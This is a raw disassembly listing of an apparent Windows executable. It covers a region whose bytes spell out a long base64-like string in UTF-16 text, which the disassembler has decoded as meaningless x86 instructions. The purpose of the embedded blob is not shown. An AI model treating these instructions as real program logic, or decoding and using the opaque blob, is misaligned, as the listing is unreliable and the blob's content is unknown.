  40a6f5:	00 47 00             	add    %al,0x0(%edi)
  40a6f8:	54                   	push   %esp
  40a6f9:	00 74 00 50          	add    %dh,0x50(%eax,%eax,1)
  40a6fd:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40a701:	00 61 00             	add    %ah,0x0(%ecx)
  40a704:	31 00                	xor    %eax,(%eax)
  40a706:	47                   	inc    %edi
  40a707:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40a70b:	00 79 00             	add    %bh,0x0(%ecx)
  40a70e:	6c                   	insb   (%dx),%es:(%edi)
  40a70f:	00 33                	add    %dh,(%ebx)
  40a711:	00 30                	add    %dh,(%eax)
  40a713:	00 7a 00             	add    %bh,0x0(%edx)
  40a716:	78 00                	js     0x40a718
  40a718:	55                   	push   %ebp
  40a719:	00 47 00             	add    %al,0x0(%edi)
  40a71c:	59                   	pop    %ecx
  40a71d:	00 66 00             	add    %ah,0x0(%esi)
  40a720:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a724:	4f                   	dec    %edi
  40a725:	00 45 00             	add    %al,0x0(%ebp)
  40a728:	38 00                	cmp    %al,(%eax)
  40a72a:	77 00                	ja     0x40a72c
  40a72c:	5a                   	pop    %edx
  40a72d:	00 66 00             	add    %ah,0x0(%esi)
  40a730:	70 00                	jo     0x40a732
  40a732:	44                   	inc    %esp
  40a733:	00 6d 00             	add    %ch,0x0(%ebp)
  40a736:	41                   	inc    %ecx
  40a737:	00 57 00             	add    %dl,0x0(%edi)
  40a73a:	43                   	inc    %ebx
  40a73b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a73e:	35 00 41 00 37       	xor    $0x37004100,%eax
  40a743:	00 78 00             	add    %bh,0x0(%eax)
  40a746:	33 00                	xor    (%eax),%eax
  40a748:	2b 00                	sub    (%eax),%eax
  40a74a:	35 00 49 00 44       	xor    $0x44004900,%eax
  40a74f:	00 31                	add    %dh,(%ecx)
  40a751:	00 4b 00             	add    %cl,0x0(%ebx)
  40a754:	70 00                	jo     0x40a756
  40a756:	61                   	popa
  40a757:	00 4f 00             	add    %cl,0x0(%edi)
  40a75a:	77 00                	ja     0x40a75c
  40a75c:	4a                   	dec    %edx
  40a75d:	00 68 00             	add    %ch,0x0(%eax)
  40a760:	62 00                	bound  %eax,(%eax)
  40a762:	65 00 33             	add    %dh,%gs:(%ebx)
  40a765:	00 6e 00             	add    %ch,0x0(%esi)
  40a768:	7a 00                	jp     0x40a76a
  40a76a:	65 00 36             	add    %dh,%gs:(%esi)
  40a76d:	00 6d 00             	add    %ch,0x0(%ebp)
  40a770:	31 00                	xor    %eax,(%eax)
  40a772:	48                   	dec    %eax
  40a773:	00 68 00             	add    %ch,0x0(%eax)
  40a776:	37                   	aaa
  40a777:	00 4f 00             	add    %cl,0x0(%edi)
  40a77a:	65 00 6c 00 6b       	add    %ch,%gs:0x6b(%eax,%eax,1)
  40a77f:	00 78 00             	add    %bh,0x0(%eax)
  40a782:	34 00                	xor    $0x0,%al
  40a784:	6f                   	outsl  %ds:(%esi),(%dx)
  40a785:	00 6f 00             	add    %ch,0x0(%edi)
  40a788:	37                   	aaa
  40a789:	00 31                	add    %dh,(%ecx)
  40a78b:	00 43 00             	add    %al,0x0(%ebx)
  40a78e:	6a 00                	push   $0x0
  40a790:	33 00                	xor    (%eax),%eax
  40a792:	78 00                	js     0x40a794
  40a794:	73 00                	jae    0x40a796
  40a796:	61                   	popa
  40a797:	00 33                	add    %dh,(%ebx)
  40a799:	00 6e 00             	add    %ch,0x0(%esi)
  40a79c:	35 00 52 00 57       	xor    $0x57005200,%eax
  40a7a1:	00 2f                	add    %ch,(%edi)
  40a7a3:	00 64 00 66          	add    %ah,0x66(%eax,%eax,1)
  40a7a7:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7aa:	42                   	inc    %edx
  40a7ab:	00 56 00             	add    %dl,0x0(%esi)
  40a7ae:	41                   	inc    %ecx
  40a7af:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a7b2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7b3:	00 69 00             	add    %ch,0x0(%ecx)
  40a7b6:	58                   	pop    %eax
  40a7b7:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40a7bb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7be:	73 00                	jae    0x40a7c0
  40a7c0:	6c                   	insb   (%dx),%es:(%edi)
  40a7c1:	00 41 00             	add    %al,0x0(%ecx)
  40a7c4:	4e                   	dec    %esi
  40a7c5:	00 33                	add    %dh,(%ebx)
  40a7c7:	00 43 00             	add    %al,0x0(%ebx)
  40a7ca:	77 00                	ja     0x40a7cc
  40a7cc:	4c                   	dec    %esp
  40a7cd:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a7d1:	00 76 00             	add    %dh,0x0(%esi)
  40a7d4:	6b 00 36             	imul   $0x36,(%eax),%eax
  40a7d7:	00 51 00             	add    %dl,0x0(%ecx)
  40a7da:	55                   	push   %ebp
  40a7db:	00 76 00             	add    %dh,0x0(%esi)
  40a7de:	73 00                	jae    0x40a7e0
  40a7e0:	2b 00                	sub    (%eax),%eax
  40a7e2:	69 00 37 00 75 00    	imul   $0x750037,(%eax),%eax
  40a7e8:	4d                   	dec    %ebp
  40a7e9:	00 45 00             	add    %al,0x0(%ebp)
  40a7ec:	68 00 4f 00 2f       	push   $0x2f004f00
  40a7f1:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40a7f5:	00 69 00             	add    %ch,0x0(%ecx)
  40a7f8:	42                   	inc    %edx
  40a7f9:	00 41 00             	add    %al,0x0(%ecx)
  40a7fc:	61                   	popa
  40a7fd:	00 45 00             	add    %al,0x0(%ebp)
  40a800:	5a                   	pop    %edx
  40a801:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40a805:	00 32                	add    %dh,(%edx)
  40a807:	00 30                	add    %dh,(%eax)
  40a809:	00 4b 00             	add    %cl,0x0(%ebx)
  40a80c:	79 00                	jns    0x40a80e
  40a80e:	37                   	aaa
  40a80f:	00 46 00             	add    %al,0x0(%esi)
  40a812:	47                   	inc    %edi
  40a813:	00 45 00             	add    %al,0x0(%ebp)
  40a816:	78 00                	js     0x40a818
  40a818:	43                   	inc    %ebx
  40a819:	00 44 00 32          	add    %al,0x32(%eax,%eax,1)
  40a81d:	00 59 00             	add    %bl,0x0(%ecx)
  40a820:	79 00                	jns    0x40a822
  40a822:	7a 00                	jp     0x40a824
  40a824:	4f                   	dec    %edi
  40a825:	00 61 00             	add    %ah,0x0(%ecx)
  40a828:	71 00                	jno    0x40a82a
  40a82a:	33 00                	xor    (%eax),%eax
  40a82c:	74 00                	je     0x40a82e
  40a82e:	62 00                	bound  %eax,(%eax)
  40a830:	42                   	inc    %edx
  40a831:	00 33                	add    %dh,(%ebx)
  40a833:	00 63 00             	add    %ah,0x0(%ebx)
  40a836:	66 00 79 00          	data16 add %bh,0x0(%ecx)
  40a83a:	71 00                	jno    0x40a83c
  40a83c:	62 00                	bound  %eax,(%eax)
  40a83e:	44                   	inc    %esp
  40a83f:	00 62 00             	add    %ah,0x0(%edx)
  40a842:	53                   	push   %ebx
  40a843:	00 48 00             	add    %cl,0x0(%eax)
  40a846:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a84a:	6c                   	insb   (%dx),%es:(%edi)
  40a84b:	00 49 00             	add    %cl,0x0(%ecx)
  40a84e:	53                   	push   %ebx
  40a84f:	00 5a 00             	add    %bl,0x0(%edx)
  40a852:	4e                   	dec    %esi
  40a853:	00 68 00             	add    %ch,0x0(%eax)
  40a856:	44                   	inc    %esp
  40a857:	00 4c 00 75          	add    %cl,0x75(%eax,%eax,1)
  40a85b:	00 56 00             	add    %dl,0x0(%esi)
  40a85e:	42                   	inc    %edx
  40a85f:	00 62 00             	add    %ah,0x0(%edx)
  40a862:	4f                   	dec    %edi
  40a863:	00 33                	add    %dh,(%ebx)
  40a865:	00 72 00             	add    %dh,0x0(%edx)
  40a868:	49                   	dec    %ecx
  40a869:	00 36                	add    %dh,(%esi)
  40a86b:	00 7a 00             	add    %bh,0x0(%edx)
  40a86e:	49                   	dec    %ecx
  40a86f:	00 6e 00             	add    %ch,0x0(%esi)
  40a872:	51                   	push   %ecx
  40a873:	00 69 00             	add    %ch,0x0(%ecx)
  40a876:	50                   	push   %eax
  40a877:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  40a87b:	00 57 00             	add    %dl,0x0(%edi)
  40a87e:	2b 00                	sub    (%eax),%eax
  40a880:	62 00                	bound  %eax,(%eax)
  40a882:	79 00                	jns    0x40a884
  40a884:	56                   	push   %esi
  40a885:	00 70 00             	add    %dh,0x0(%eax)
  40a888:	49                   	dec    %ecx
  40a889:	00 61 00             	add    %ah,0x0(%ecx)
  40a88c:	4d                   	dec    %ebp
  40a88d:	00 6f 00             	add    %ch,0x0(%edi)
  40a890:	45                   	inc    %ebp
  40a891:	00 67 00             	add    %ah,0x0(%edi)
  40a894:	36 00 54 00 44       	add    %dl,%ss:0x44(%eax,%eax,1)
  40a899:	00 69 00             	add    %ch,0x0(%ecx)
  40a89c:	32 00                	xor    (%eax),%al
  40a89e:	70 00                	jo     0x40a8a0
  40a8a0:	4a                   	dec    %edx
  40a8a1:	00 69 00             	add    %ch,0x0(%ecx)
  40a8a4:	67 00 63 00          	add    %ah,0x0(%bp,%di)
  40a8a8:	61                   	popa
  40a8a9:	00 77 00             	add    %dh,0x0(%edi)
  40a8ac:	70 00                	jo     0x40a8ae
  40a8ae:	63 00                	arpl   %eax,(%eax)
  40a8b0:	5a                   	pop    %edx
  40a8b1:	00 44 00 2b          	add    %al,0x2b(%eax,%eax,1)
  40a8b5:	00 66 00             	add    %ah,0x0(%esi)
  40a8b8:	4b                   	dec    %ebx
  40a8b9:	00 57 00             	add    %dl,0x0(%edi)
  40a8bc:	47                   	inc    %edi
  40a8bd:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40a8c1:	00 39                	add    %bh,(%ecx)
  40a8c3:	00 70 00             	add    %dh,0x0(%eax)
  40a8c6:	70 00                	jo     0x40a8c8
  40a8c8:	47                   	inc    %edi
  40a8c9:	00 74 00 66          	add    %dh,0x66(%eax,%eax,1)
  40a8cd:	00 33                	add    %dh,(%ebx)
  40a8cf:	00 57 00             	add    %dl,0x0(%edi)
  40a8d2:	4d                   	dec    %ebp
  40a8d3:	00 62 00             	add    %ah,0x0(%edx)
  40a8d6:	58                   	pop    %eax
  40a8d7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40a8db:	00 70 00             	add    %dh,0x0(%eax)
  40a8de:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a8e2:	71 00                	jno    0x40a8e4
  40a8e4:	50                   	push   %eax
  40a8e5:	00 52 00             	add    %dl,0x0(%edx)
  40a8e8:	39 00                	cmp    %eax,(%eax)
  40a8ea:	73 00                	jae    0x40a8ec
  40a8ec:	6d                   	insl   (%dx),%es:(%edi)
  40a8ed:	00 38                	add    %bh,(%eax)
  40a8ef:	00 5a 00             	add    %bl,0x0(%edx)
  40a8f2:	43                   	inc    %ebx
  40a8f3:	00 2f                	add    %ch,(%edi)
  40a8f5:	00 43 00             	add    %al,0x0(%ebx)
  40a8f8:	56                   	push   %esi
  40a8f9:	00 64 00 7a          	add    %ah,0x7a(%eax,%eax,1)
  40a8fd:	00 33                	add    %dh,(%ebx)
  40a8ff:	00 79 00             	add    %bh,0x0(%ecx)
  40a902:	76 00                	jbe    0x40a904
  40a904:	38 00                	cmp    %al,(%eax)
  40a906:	33 00                	xor    (%eax),%eax
  40a908:	63 00                	arpl   %eax,(%eax)
  40a90a:	41                   	inc    %ecx
  40a90b:	00 2b                	add    %ch,(%ebx)
  40a90d:	00 4e 00             	add    %cl,0x0(%esi)
  40a910:	52                   	push   %edx
  40a911:	00 4b 00             	add    %cl,0x0(%ebx)
  40a914:	76 00                	jbe    0x40a916
  40a916:	51                   	push   %ecx
  40a917:	00 50 00             	add    %dl,0x0(%eax)
  40a91a:	73 00                	jae    0x40a91c
  40a91c:	7a 00                	jp     0x40a91e
  40a91e:	6f                   	outsl  %ds:(%esi),(%dx)
  40a91f:	00 66 00             	add    %ah,0x0(%esi)
  40a922:	62 00                	bound  %eax,(%eax)
  40a924:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40a928:	59                   	pop    %ecx
  40a929:	00 4c 00 49          	add    %cl,0x49(%eax,%eax,1)
  40a92d:	00 73 00             	add    %dh,0x0(%ebx)
  40a930:	6b 00 43             	imul   $0x43,(%eax),%eax
  40a933:	00 46 00             	add    %al,0x0(%esi)
  40a936:	6b 00 76             	imul   $0x76,(%eax),%eax
  40a939:	00 4f 00             	add    %cl,0x0(%edi)
  40a93c:	76 00                	jbe    0x40a93e
  40a93e:	6b 00 68             	imul   $0x68,(%eax),%eax
  40a941:	00 35 00 43 00 74    	add    %dh,0x74004300
  40a947:	00 57 00             	add    %dl,0x0(%edi)
  40a94a:	35 00 2f 00 41       	xor    $0x41002f00,%eax
  40a94f:	00 42 00             	add    %al,0x0(%edx)
  40a952:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a956:	48                   	dec    %eax
  40a957:	00 64 00 49          	add    %ah,0x49(%eax,%eax,1)
  40a95b:	00 79 00             	add    %bh,0x0(%ecx)
  40a95e:	46                   	inc    %esi
  40a95f:	00 44 00 72          	add    %al,0x72(%eax,%eax,1)
  40a963:	00 61 00             	add    %ah,0x0(%ecx)
  40a966:	2f                   	das
  40a967:	00 45 00             	add    %al,0x0(%ebp)
  40a96a:	77 00                	ja     0x40a96c
  40a96c:	53                   	push   %ebx
  40a96d:	00 78 00             	add    %bh,0x0(%eax)
  40a970:	57                   	push   %edi
  40a971:	00 6f 00             	add    %ch,0x0(%edi)
  40a974:	78 00                	js     0x40a976
  40a976:	4c                   	dec    %esp
  40a977:	00 6a 00             	add    %ch,0x0(%edx)
  40a97a:	75 00                	jne    0x40a97c
  40a97c:	59                   	pop    %ecx
  40a97d:	00 6e 00             	add    %ch,0x0(%esi)
  40a980:	5a                   	pop    %edx
  40a981:	00 31                	add    %dh,(%ecx)
  40a983:	00 67 00             	add    %ah,0x0(%edi)
  40a986:	70 00                	jo     0x40a988
  40a988:	53                   	push   %ebx
  40a989:	00 31                	add    %dh,(%ecx)
  40a98b:	00 4f 00             	add    %cl,0x0(%edi)
  40a98e:	39 00                	cmp    %eax,(%eax)
  40a990:	4e                   	dec    %esi
  40a991:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40a995:	00 66 00             	add    %ah,0x0(%esi)
  40a998:	61                   	popa
  40a999:	00 79 00             	add    %bh,0x0(%ecx)
  40a99c:	42                   	inc    %edx
  40a99d:	00 2f                	add    %ch,(%edi)
  40a99f:	00 41 00             	add    %al,0x0(%ecx)
  40a9a2:	6e                   	outsb  %ds:(%esi),(%dx)
  40a9a3:	00 51 00             	add    %dl,0x0(%ecx)
  40a9a6:	46                   	inc    %esi
  40a9a7:	00 5a 00             	add    %bl,0x0(%edx)
  40a9aa:	50                   	push   %eax
  40a9ab:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40a9af:	00 59 00             	add    %bl,0x0(%ecx)
  40a9b2:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a9b6:	76 00                	jbe    0x40a9b8
  40a9b8:	2f                   	das
  40a9b9:	00 2b                	add    %ch,(%ebx)
  40a9bb:	00 45 00             	add    %al,0x0(%ebp)
  40a9be:	67 00 37             	add    %dh,(%bx)
  40a9c1:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40a9c5:	00 33                	add    %dh,(%ebx)
  40a9c7:	00 73 00             	add    %dh,0x0(%ebx)
  40a9ca:	77 00                	ja     0x40a9cc
  40a9cc:	43                   	inc    %ebx
  40a9cd:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40a9d1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a9d4:	47                   	inc    %edi
  40a9d5:	00 67 00             	add    %ah,0x0(%edi)
  40a9d8:	74 00                	je     0x40a9da
  40a9da:	62 00                	bound  %eax,(%eax)
  40a9dc:	6c                   	insb   (%dx),%es:(%edi)
  40a9dd:	00 45 00             	add    %al,0x0(%ebp)
  40a9e0:	43                   	inc    %ebx
  40a9e1:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9e4:	64 00 53 00          	add    %dl,%fs:0x0(%ebx)
  40a9e8:	53                   	push   %ebx
  40a9e9:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40a9ed:	00 68 00             	add    %ch,0x0(%eax)
  40a9f0:	43                   	inc    %ebx
  40a9f1:	00 41 00             	add    %al,0x0(%ecx)
  40a9f4:	75 00                	jne    0x40a9f6
  40a9f6:	2f                   	das
  40a9f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a9fa:	7a 00                	jp     0x40a9fc
  40a9fc:	66 00 4c 00 44       	data16 add %cl,0x44(%eax,%eax,1)
  40aa01:	00 54 00 35          	add    %dl,0x35(%eax,%eax,1)
  40aa05:	00 41 00             	add    %al,0x0(%ecx)
  40aa08:	42                   	inc    %edx
  40aa09:	00 55 00             	add    %dl,0x0(%ebp)
  40aa0c:	52                   	push   %edx
  40aa0d:	00 55 00             	add    %dl,0x0(%ebp)
  40aa10:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40aa14:	2f                   	das
  40aa15:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa18:	47                   	inc    %edi
  40aa19:	00 75 00             	add    %dh,0x0(%ebp)
  40aa1c:	68 00 71 00 71       	push   $0x71007100
  40aa21:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40aa25:	00 6a 00             	add    %ch,0x0(%edx)
  40aa28:	51                   	push   %ecx
  40aa29:	00 4d 00             	add    %cl,0x0(%ebp)
  40aa2c:	6f                   	outsl  %ds:(%esi),(%dx)
  40aa2d:	00 41 00             	add    %al,0x0(%ecx)
  40aa30:	43                   	inc    %ebx
  40aa31:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40aa35:	00 51 00             	add    %dl,0x0(%ecx)
  40aa38:	46                   	inc    %esi
  40aa39:	00 36                	add    %dh,(%esi)
  40aa3b:	00 36                	add    %dh,(%esi)
  40aa3d:	00 79 00             	add    %bh,0x0(%ecx)
  40aa40:	38 00                	cmp    %al,(%eax)
  40aa42:	6c                   	insb   (%dx),%es:(%edi)
  40aa43:	00 35 00 2b 00 2b    	add    %dh,0x2b002b00
  40aa49:	00 65 00             	add    %ah,0x0(%ebp)
  40aa4c:	53                   	push   %ebx
  40aa4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa50:	32 00                	xor    (%eax),%al
  40aa52:	50                   	push   %eax
  40aa53:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40aa57:	00 6e 00             	add    %ch,0x0(%esi)
  40aa5a:	58                   	pop    %eax
  40aa5b:	00 68 00             	add    %ch,0x0(%eax)
  40aa5e:	6c                   	insb   (%dx),%es:(%edi)
  40aa5f:	00 57 00             	add    %dl,0x0(%edi)
  40aa62:	34 00                	xor    $0x0,%al
  40aa64:	70 00                	jo     0x40aa66
  40aa66:	79 00                	jns    0x40aa68
  40aa68:	4d                   	dec    %ebp
  40aa69:	00 52 00             	add    %dl,0x0(%edx)
  40aa6c:	64 00 72 00          	add    %dh,%fs:0x0(%edx)
  40aa70:	45                   	inc    %ebp
  40aa71:	00 43 00             	add    %al,0x0(%ebx)
  40aa74:	78 00                	js     0x40aa76
  40aa76:	49                   	dec    %ecx
  40aa77:	00 4a 00             	add    %cl,0x0(%edx)
  40aa7a:	76 00                	jbe    0x40aa7c
  40aa7c:	61                   	popa
  40aa7d:	00 7a 00             	add    %bh,0x0(%edx)
  40aa80:	42                   	inc    %edx
  40aa81:	00 65 00             	add    %ah,0x0(%ebp)
  40aa84:	50                   	push   %eax
  40aa85:	00 61 00             	add    %ah,0x0(%ecx)
  40aa88:	7a 00                	jp     0x40aa8a
  40aa8a:	51                   	push   %ecx
  40aa8b:	00 55 00             	add    %dl,0x0(%ebp)
  40aa8e:	73 00                	jae    0x40aa90
  40aa90:	6a 00                	push   $0x0
  40aa92:	4e                   	dec    %esi
  40aa93:	00 2b                	add    %ch,(%ebx)
  40aa95:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40aa99:	00 36                	add    %dh,(%esi)
  40aa9b:	00 48 00             	add    %cl,0x0(%eax)
  40aa9e:	41                   	inc    %ecx
  40aa9f:	00 49 00             	add    %cl,0x0(%ecx)
  40aaa2:	4b                   	dec    %ebx
  40aaa3:	00 62 00             	add    %ah,0x0(%edx)
  40aaa6:	7a 00                	jp     0x40aaa8
  40aaa8:	38 00                	cmp    %al,(%eax)
  40aaaa:	50                   	push   %eax
  40aaab:	00 75 00             	add    %dh,0x0(%ebp)
  40aaae:	66 00 44 00 38       	data16 add %al,0x38(%eax,%eax,1)
  40aab3:	00 35 00 6f 00 75    	add    %dh,0x75006f00
  40aab9:	00 43 00             	add    %al,0x0(%ebx)
  40aabc:	30 00                	xor    %al,(%eax)
  40aabe:	59                   	pop    %ecx
  40aabf:	00 68 00             	add    %ch,0x0(%eax)
  40aac2:	32 00                	xor    (%eax),%al
  40aac4:	7a 00                	jp     0x40aac6
  40aac6:	32 00                	xor    (%eax),%al
  40aac8:	55                   	push   %ebp
  40aac9:	00 30                	add    %dh,(%eax)
  40aacb:	00 35 00 74 00 6c    	add    %dh,0x6c007400
  40aad1:	00 72 00             	add    %dh,0x0(%edx)
  40aad4:	55                   	push   %ebp
  40aad5:	00 76 00             	add    %dh,0x0(%esi)
  40aad8:	41                   	inc    %ecx
  40aad9:	00 6a 00             	add    %ch,0x0(%edx)
  40aadc:	44                   	inc    %esp
  40aadd:	00 50 00             	add    %dl,0x0(%eax)
  40aae0:	33 00                	xor    (%eax),%eax
  40aae2:	75 00                	jne    0x40aae4
  40aae4:	55                   	push   %ebp
  40aae5:	00 73 00             	add    %dh,0x0(%ebx)
  40aae8:	39 00                	cmp    %eax,(%eax)
  40aaea:	4a                   	dec    %edx
  40aaeb:	00 76 00             	add    %dh,0x0(%esi)
  40aaee:	79 00                	jns    0x40aaf0
  40aaf0:	73 00                	jae    0x40aaf2
  40aaf2:	6b 00 34             	imul   $0x34,(%eax),%eax
  40aaf5:	00 75 00             	add    %dh,0x0(%ebp)
  40aaf8:	66 00 45 00          	data16 add %al,0x0(%ebp)
  40aafc:	2b 00                	sub    (%eax),%eax
  40aafe:	54                   	push   %esp
  40aaff:	00 48 00             	add    %cl,0x0(%eax)
  40ab02:	35 00 39 00 59       	xor    $0x59003900,%eax
  40ab07:	00 52 00             	add    %dl,0x0(%edx)
  40ab0a:	62 00                	bound  %eax,(%eax)
  40ab0c:	49                   	dec    %ecx
  40ab0d:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab10:	74 00                	je     0x40ab12
  40ab12:	51                   	push   %ecx
  40ab13:	00 49 00             	add    %cl,0x0(%ecx)
  40ab16:	41                   	inc    %ecx
  40ab17:	00 7a 00             	add    %bh,0x0(%edx)
  40ab1a:	46                   	inc    %esi
  40ab1b:	00 35 00 59 00 64    	add    %dh,0x64005900
  40ab21:	00 6a 00             	add    %ch,0x0(%edx)
  40ab24:	75 00                	jne    0x40ab26
  40ab26:	30 00                	xor    %al,(%eax)
  40ab28:	45                   	inc    %ebp
  40ab29:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40ab2d:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40ab31:	00 71 00             	add    %dh,0x0(%ecx)
  40ab34:	50                   	push   %eax
  40ab35:	00 33                	add    %dh,(%ebx)
  40ab37:	00 68 00             	add    %ch,0x0(%eax)
  40ab3a:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40ab3e:	6d                   	insl   (%dx),%es:(%edi)
  40ab3f:	00 6e 00             	add    %ch,0x0(%esi)
  40ab42:	43                   	inc    %ebx
  40ab43:	00 51 00             	add    %dl,0x0(%ecx)
  40ab46:	75 00                	jne    0x40ab48
  40ab48:	45                   	inc    %ebp
  40ab49:	00 4a 00             	add    %cl,0x0(%edx)
  40ab4c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab4d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ab50:	37                   	aaa
  40ab51:	00 4e 00             	add    %cl,0x0(%esi)
  40ab54:	52                   	push   %edx
  40ab55:	00 73 00             	add    %dh,0x0(%ebx)
  40ab58:	7a 00                	jp     0x40ab5a
  40ab5a:	2f                   	das
  40ab5b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ab5e:	34 00                	xor    $0x0,%al
  40ab60:	4c                   	dec    %esp
  40ab61:	00 57 00             	add    %dl,0x0(%edi)
  40ab64:	72 00                	jb     0x40ab66
  40ab66:	65 00 38             	add    %bh,%gs:(%eax)
  40ab69:	00 49 00             	add    %cl,0x0(%ecx)
  40ab6c:	55                   	push   %ebp
  40ab6d:	00 6a 00             	add    %ch,0x0(%edx)
  40ab70:	4d                   	dec    %ebp
  40ab71:	00 4f 00             	add    %cl,0x0(%edi)
  40ab74:	4d                   	dec    %ebp
  40ab75:	00 4e 00             	add    %cl,0x0(%esi)
  40ab78:	70 00                	jo     0x40ab7a
  40ab7a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ab7b:	00 56 00             	add    %dl,0x0(%esi)
  40ab7e:	49                   	dec    %ecx
  40ab7f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ab82:	76 00                	jbe    0x40ab84
  40ab84:	75 00                	jne    0x40ab86
  40ab86:	7a 00                	jp     0x40ab88
  40ab88:	39 00                	cmp    %eax,(%eax)
  40ab8a:	2f                   	das
  40ab8b:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40ab8f:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40ab93:	00 56 00             	add    %dl,0x0(%esi)
  40ab96:	51                   	push   %ecx
  40ab97:	00 69 00             	add    %ch,0x0(%ecx)
  40ab9a:	58                   	pop    %eax
  40ab9b:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40ab9f:	00 67 00             	add    %ah,0x0(%edi)
  40aba2:	53                   	push   %ebx
  40aba3:	00 77 00             	add    %dh,0x0(%edi)
  40aba6:	4b                   	dec    %ebx
  40aba7:	00 77 00             	add    %dh,0x0(%edi)
  40abaa:	6f                   	outsl  %ds:(%esi),(%dx)
  40abab:	00 6a 00             	add    %ch,0x0(%edx)
  40abae:	4e                   	dec    %esi
  40abaf:	00 76 00             	add    %dh,0x0(%esi)
  40abb2:	4f                   	dec    %edi
  40abb3:	00 62 00             	add    %ah,0x0(%edx)
  40abb6:	65 00 4f 00          	add    %cl,%gs:0x0(%edi)
  40abba:	44                   	inc    %esp
  40abbb:	00 44 00 42          	add    %al,0x42(%eax,%eax,1)
  40abbf:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40abc3:	00 4e 00             	add    %cl,0x0(%esi)
  40abc6:	2f                   	das
  40abc7:	00 2f                	add    %ch,(%edi)
  40abc9:	00 62 00             	add    %ah,0x0(%edx)
  40abcc:	45                   	inc    %ebp
  40abcd:	00 57 00             	add    %dl,0x0(%edi)
  40abd0:	51                   	push   %ecx
  40abd1:	00 79 00             	add    %bh,0x0(%ecx)
  40abd4:	58                   	pop    %eax
  40abd5:	00 63 00             	add    %ah,0x0(%ebx)
  40abd8:	4a                   	dec    %edx
  40abd9:	00 72 00             	add    %dh,0x0(%edx)
  40abdc:	4b                   	dec    %ebx
  40abdd:	00 50 00             	add    %dl,0x0(%eax)
  40abe0:	7a 00                	jp     0x40abe2
  40abe2:	30 00                	xor    %al,(%eax)
  40abe4:	4a                   	dec    %edx
  40abe5:	00 36                	add    %dh,(%esi)
  40abe7:	00 2f                	add    %ch,(%edi)
  40abe9:	00 39                	add    %bh,(%ecx)
  40abeb:	00 59 00             	add    %bl,0x0(%ecx)
  40abee:	48                   	dec    %eax
  40abef:	00 53 00             	add    %dl,0x0(%ebx)
  40abf2:	6e                   	outsb  %ds:(%esi),(%dx)
  40abf3:	00 66 00             	add    %ah,0x0(%esi)
  40abf6:	2f                   	das
  40abf7:	00 71 00             	add    %dh,0x0(%ecx)
  40abfa:	61                   	popa
  40abfb:	00 6e 00             	add    %ch,0x0(%esi)
  40abfe:	71 00                	jno    0x40ac00
  40ac00:	55                   	push   %ebp
  40ac01:	00 69 00             	add    %ch,0x0(%ecx)
  40ac04:	4c                   	dec    %esp
  40ac05:	00 45 00             	add    %al,0x0(%ebp)
  40ac08:	6a 00                	push   $0x0
  40ac0a:	69 00 53 00 73 00    	imul   $0x730053,(%eax),%eax
  40ac10:	61                   	popa
  40ac11:	00 59 00             	add    %bl,0x0(%ecx)
  40ac14:	50                   	push   %eax
  40ac15:	00 4e 00             	add    %cl,0x0(%esi)
  40ac18:	6d                   	insl   (%dx),%es:(%edi)
  40ac19:	00 2f                	add    %ch,(%edi)
  40ac1b:	00 32                	add    %dh,(%edx)
  40ac1d:	00 51 00             	add    %dl,0x0(%ecx)
  40ac20:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40ac24:	58                   	pop    %eax
  40ac25:	00 33                	add    %dh,(%ebx)
  40ac27:	00 56 00             	add    %dl,0x0(%esi)
  40ac2a:	74 00                	je     0x40ac2c
  40ac2c:	4d                   	dec    %ebp
  40ac2d:	00 47 00             	add    %al,0x0(%edi)
  40ac30:	4b                   	dec    %ebx
  40ac31:	00 32                	add    %dh,(%edx)
  40ac33:	00 78 00             	add    %bh,0x0(%eax)
  40ac36:	61                   	popa
  40ac37:	00 4e 00             	add    %cl,0x0(%esi)
